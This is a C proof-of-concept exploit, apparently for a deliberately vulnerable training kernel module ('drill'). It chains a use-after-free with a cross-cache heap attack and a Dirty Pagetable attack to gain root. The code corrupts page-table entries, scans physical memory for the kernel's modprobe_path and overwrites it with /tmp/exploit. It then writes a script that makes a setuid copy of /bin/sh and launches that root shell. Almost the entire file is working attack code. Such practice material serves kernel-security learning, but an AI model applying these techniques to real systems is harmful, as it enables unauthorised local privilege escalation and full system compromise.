/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Currently, this PoC performs Dirty Pagetable attack for LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/xattr.h>
#include <assert.h>
#include <sched.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include "drill.h"

/*==== Pagetables stuff =====*/
/*
* uncomment/comment define below if you want another approach 
* PMD is more powerful and a bit more stable, PTE is more classical.
*/
#define PMD_ENCHACMENT

#ifdef PMD_ENCHACMENT /* PMD variant */
    #define PHYS_AREA 0x200000
    #define CORUPT_AMOUNT 5 /* the corrupted amount may be lower due to huge pages */
    #define SANITY_BOUND 0x20000000 /* if we don't find modprobe, there's no reason to scan further. Higher up if LPE doesn't work */
#else /* PTE variant */
    #define PHYS_AREA 0x1000
    #define CORUPT_AMOUNT 25 /* not recommended to set it higher than 200 */
    #define SANITY_BOUND 0x4000000 /* PTE dumps much less memory, so lower the bound */
#endif

#define KMOD_PATH_LEN 256  /* default */
#define PAGE_SIZE 4096 /* default */
#define ENTRIES_AMOUNT 512 /* standart for any pagetable */
#define KERNEL_BASE 0x1000000 /* works only with KASLR disabled. It may be set to 0x2000000 for modprobe search speedup. */

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3
#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }
/*==== Pagetables stuff =====*/
void do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);
	}

	printf("[+] pinned to CPU #0\n");
}

void run_sh(void)
{
	pid_t pid = -1;
	char *args[] = {
		"/tmp/root_shell", /* corrupted shell, created by exploit */
		"-p",
		NULL
	};
	int status = 0;

	pid = fork();

	if (pid < 0) {
		perror("[-] fork");
		return;
	}

	if (pid == 0) {
		execve("/tmp/root_shell", args, NULL); /* Should not return */
		perror("[-] execve");
		exit(EXIT_FAILURE);
	}

	if (wait(&status) < 0)
		perror("[-] wait");
}

int act(int fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

int read_file(const char *filename, void *buf, size_t buflen)
{
	int fd;
	int retv;
	fd = open(filename, O_RDONLY);
	if (fd < 0) {
		perror("[-] open");
		exit(EXIT_FAILURE);
	}
	retv = read(fd, buf, buflen);
	if (retv < 0) {
		perror("[-] read");
		exit(EXIT_FAILURE);
	}
	close(fd);
	return retv;
}

static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;

		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;
	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);
	if (size == buflen)
		printf("[*] ==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====\n");
	buf[size-1] = '\x00'; /* cleanup line end */
	printf("[+] current modprobe path: %s\n", buf);
	return size;
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;
	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);
	fexecve(fd, &argv_envp, &argv_envp);
	close(fd);
}

void gen_privesc_script()
{
    FILE *fp = fopen("/tmp/exploit", "w");
	if (!fp) {
		perror("file open");
		exit(EXIT_FAILURE);
	}
    fprintf(fp, "#!/bin/sh\n");
    fprintf(fp, "cp /bin/sh /tmp/root_shell\n");
    fprintf(fp, "chmod +s /tmp/root_shell\n");
    fclose(fp);
	chmod("/tmp/exploit", 0755);
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);

	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *modprobe_addr;
	modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (modprobe_addr == NULL)
		return NULL;
	printf("[+] found, rewriting to check if it is false positive\n");
	/* check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe */
	strcpy(modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0) {
		printf("[-] ^false positive. skipping to next one\n");
		return NULL;
	}

	return modprobe_addr;
}

int prepare_tables()
{
	/* prepare infra */
    void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    *(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
    if (retv == MAP_FAILED)
    {
        perror("[-] mmap");
        exit(EXIT_FAILURE);
    }

	/* Pre-register new tables and entries */
    #ifdef PMD_ENCHACMENT
    for (unsigned long long i = 0; i < 512; i++) {
		retv = mmap((void *)PTI_TO_VIRT(1, 1, i, 0, 0), 0x1000, PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}
	char level[] = "PMD";
    #else
	for (unsigned long long i = 0; i < 512; i++) {
		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}
	char level[] = "PTE";
    #endif
    if (retv == MAP_FAILED)
    {
        perror("[-] mmap");
        exit(EXIT_FAILURE);
    }
	printf("[+] done, %s is ready for allocation\n", level);
    return 0;
}

int UAF_write(int phys_addr, int uaf_n_val, int fd)
{
	char data_for_drill[16];
	int ret;
    int addr_step;
    int flags;
    #ifdef PMD_ENCHACMENT
        addr_step = 0x200000;
        flags = 0xE7;  /* huge entry, RW access for normal users and some sanity flags */
    #else
        addr_step = 0x1000;
        flags = 0x67; /* RW access for normal users and some sanity flags */
    #endif
	for (int i = 0; i < CORUPT_AMOUNT; i++) {
		snprintf(data_for_drill, sizeof(data_for_drill), "0x%08x" " %d", phys_addr + flags + i * addr_step, ((i * 8)) % 72);
		ret = act(fd, DRILL_ACT_SAVE_VAL, uaf_n_val + (i / 9), data_for_drill); /* try to use the entire UAF object */
		if (ret == EXIT_FAILURE)
			exit(EXIT_FAILURE);
	}
	return 0;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare pagetables infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create pagetable to allocate freed memory
 *  - perform uaf write using the dangling reference
 *  - create an exploit file and write its path as new modprobe path via the overwritten target object
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

int main(void)
{
	int ret = EXIT_FAILURE;
	int fd = -1;
	long i = 0;
	long current_n = 0;
    long reserved_from_n = 0;
	long uaf_n = 0;
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };
	void *modprobe_addr;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
	#ifdef PMD_ENCHACMENT
        printf("Exploiting the PMD\n");
    #else
        printf("Exploiting the PTE\n");
    #endif
	get_modprobe_path(modprobe_path, KMOD_PATH_LEN); /* check modprobe before exploitation */
    size_t modprobe_path_len = strlen(modprobe_path); /* used for non-default modprobe */

	fd = open("/proc/drill_act", O_WRONLY);
	if (fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	printf("[!] pin the process to a single CPU\n");
	do_cpu_pinning();

	printf("[!] prepare pagetables infrastructure\n");
	prepare_tables();

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
    printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for pagetable\n");

	printf("[!] create pagetable to allocate freed memory\n");
	for (unsigned long long i=0; i < ENTRIES_AMOUNT; i++) {
        #ifdef PMD_ENCHACMENT
            *(unsigned int*)PTI_TO_VIRT(1, 1, i, 0, 0) = 0xcafecafe; /* create and fill PMD */
        #else
		    *(unsigned int*)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
        #endif
	}
	printf("[+] done, vulnerable pagetable has been created\n");

	/* Doing rewrite to change pagetable entries */
	printf("[!] perform uaf write using the dangling reference\n");
	printf("[+] Attempting to overwrite pagetable entries. This may kill your kernel.\n");
	UAF_write(KERNEL_BASE, uaf_n, fd);
	int phys_addr = KERNEL_BASE + CORUPT_AMOUNT * PHYS_AREA;
	printf("[+] done, searching for modprobe path in phys area: %x - %x\n", KERNEL_BASE, phys_addr);
	while (phys_addr < SANITY_BOUND) {
		#ifdef PMD_ENCHACMENT // flush TLB to update the addresses
			flush_tlb(PTI_TO_VIRT(1, 1, 0, 0, 0),0x40000000);
		#else
			flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000);
		#endif
		for (int i = 0; i < ENTRIES_AMOUNT; i++) {
            #ifdef PMD_ENCHACMENT
                unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 1, i, 0, 0);
                void *virt_address = PTI_TO_VIRT(1, 1, i, 0, 0);
            #else
                unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0);
                void *virt_address = PTI_TO_VIRT(1, 0, 1, i, 0);
            #endif
                unsigned int value = *ptr;
			if (value != 0xcafecafe) {
				modprobe_addr = memmem_modprobe_path(virt_address, PHYS_AREA, modprobe_path, modprobe_path_len);
				if (modprobe_addr != NULL) {
					printf("[+] success, userspace modprobe address %p\n", modprobe_addr);
					printf("[!] create an exploit file and write its path as new modprobe path via the overwritten target object\n");
					gen_privesc_script();
					strcpy(modprobe_addr, "/tmp/exploit");
					printf("[+] done, triggering a corrupted modprobe to create a root shell with suid\n");
					modprobe_trigger_memfd();
					printf("[+] launching root shell\n");
					run_sh();
				}
			}
		}
		printf("[+] modprobe path not found, scanning the next area: %x - %x\n",phys_addr,phys_addr + CORUPT_AMOUNT * PHYS_AREA);
		UAF_write(phys_addr, uaf_n, fd);
		phys_addr = phys_addr + CORUPT_AMOUNT * PHYS_AREA;
	}    
	
end:
	printf("[!] finishing this PoC exploit\n");

	if (fd >= 0) {
		ret = close(fd);
		if (ret != 0)
			perror("[-] close fd");
		printf("  closed the drill_act fd\n");
	}

	return ret;
}